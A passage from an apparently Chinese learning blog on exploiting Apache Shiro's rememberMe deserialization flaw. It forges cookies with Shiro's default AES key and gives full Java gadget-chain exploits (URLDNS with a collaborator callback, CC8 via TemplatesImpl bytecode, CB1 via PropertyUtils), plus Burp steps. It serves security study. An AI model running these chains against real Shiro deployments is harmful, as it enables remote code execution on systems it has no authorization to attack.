class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;object.ser&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>这条链很短，跟过之前的链子，再回过头看真的很简单，这里直接上Exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://fbuj4kl1p0zk9fwg0my69sta319sxold.oastify.com&quot;</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(url,<span class="string">&quot;hashCode&quot;</span>,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把生成的序列化字符串文件object.ser，放到cookie加密脚本同目录下，然后运行脚本生成cookie：<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999017177-947cd84c-d1f3-4140-aea7-c728638989ad.png" alt="image.png"><br>burp抓包，更换rememberMe字段cookie，打过去，注意要删掉多余的JSESSIONID，这和代码流程有关<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999283905-79aaf41a-aa36-42be-b5bf-3c3f06278df4.png" alt="image.png"><br>burp的collaborator模块，狂点Poll now，就能够接收到请求记录<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999315175-cf6b5f5c-b38c-4fb4-8454-344710dfc4d4.png" alt="image.png"></p><h2 id="CC8"><a href="#CC8" class="headerlink" title="CC8"></a>CC8</h2><p>这个要加Commons Collections3的依赖，因为Shiro本身并不带Commons Collections3，test的不算</p><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1693999853223-2530f8a9-dc3f-4f43-a174-62d3385d77f5.png" alt="image.png"></p><p>加了CC3的依赖，按理说应该每条CC3的链子我们都能打通，但是当我们尝试用CC6去打的时候会有以下报错<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694000222650-5772d7a6-6ff2-436a-99c4-26f235c121c7.png" alt="image.png"><br>意思是无法加载Transomer数组这个类，这意味着我们没办法用ChainedTransformer类了，而不用chainedTransformer数组的链子，很容易想到CC2的特点，代码执行+不用数组<br>尝试编写Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2部分</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的；反序列化的会自己赋值，可以注释掉</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">//用invokerTransformer触发newTransformer = = </span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样一来就没有用数组，另外把问题转化成调用xxx.transform()了，这里用CC6的后半段就好<br>注意： “key2”改成templates，chainedTransformer改成invokerTransformer<br>完整Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC8</span> &#123;</span><br><span class="line">    <span class="comment">// CC2+CC6 实现不使用Transform数组，并且代码执行</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//设置变量，确保函数流程走通</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory是，想提前调用链条的时候设置的，反序列化的时候可以注释掉，它会在反序列化的时候自己赋值</span></span><br><span class="line"><span class="comment">//        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        <span class="comment">// 用invokerTransformer触发newTransformer</span></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="comment">// invokerTransformer.transform();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC6部分</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        <span class="comment">//修改链子，避免put的时候自己电脑老执行命令</span></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        lazyMap.get(&quot;Jasper&quot;);</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"><span class="comment">//        tiedMapEntry.getValue();</span></span><br><span class="line"><span class="comment">//        tiedMapEntry.hashCode();</span></span><br><span class="line"><span class="comment">//        Class clazz = Class.forName(&quot;java.util.HashMap&quot;);</span></span><br><span class="line"><span class="comment">//        Method hashMethod = clazz.getDeclaredMethod(&quot;hash&quot;, Object.class);</span></span><br><span class="line"><span class="comment">//        hashMethod.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        hashMethod.invoke(clazz,tiedMapEntry);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap1.put(tiedMapEntry,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="comment">//把链子改回来</span></span><br><span class="line">        setFieldValue(lazyMap,<span class="string">&quot;factory&quot;</span>,invokerTransformer);</span><br><span class="line">        <span class="comment">//绕过IF判断，调用Transform</span></span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">       serialize(hashMap1);</span><br><span class="line">        <span class="comment">// unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001180401-312875f7-c0f9-4c4d-a815-04167e5add64.png" alt="image.png"></p><h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>CB1链是完全只需要Shiro自带依赖，就可以打通的链子，用到的模块是Commons BeanUtils<br>这个模块有个PropertyUtils.getProperty()可以根据传参调用对应的getter方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1694001350649-32b68692-39fa-42b4-a4ab-5d663a366625.png#averageHue=%236dab6a&clientId=ue6e9373e-da05-4&from=paste&height=245&id=ub9e27978&originHeight=306&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50083&status=done&style=none&taskId=u79659392-fd70-47aa-a783-9369b62b04f&title=&width=1071.2" alt="image.png"><br>在CC3的TemplatesImpl#newTransformer()里提到，调用newTransformer的还有getOutputProperties这个方法，换言之通过getOutputProperties也可代码执行，尝试编写Exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//反序列化执行readObject()方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        fis.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1694001786024-862a8044-59ae-4816-88db-0edfc788922b.png" alt="image.png"><br>那么又因为PropertyUtils.getProperty()可以调用任意getter方法，尝试一下调用getOutputProperties()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCB1</span> &#123;</span><br><span class="line">    <span class="comment">// 参考CC3和CC4</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        JavaBean bean = new JavaBean();</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;name = &quot;+ PropertyUtils.getProperty(bean,&quot;name&quot;));</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Codes\\Java\\javasec\\CC\\target\\classes\\pojo\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        <span class="comment">// _tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTrnasformer()看一眼效果，就要设置_tfactory</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">       PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(o);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;序列化完成...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span 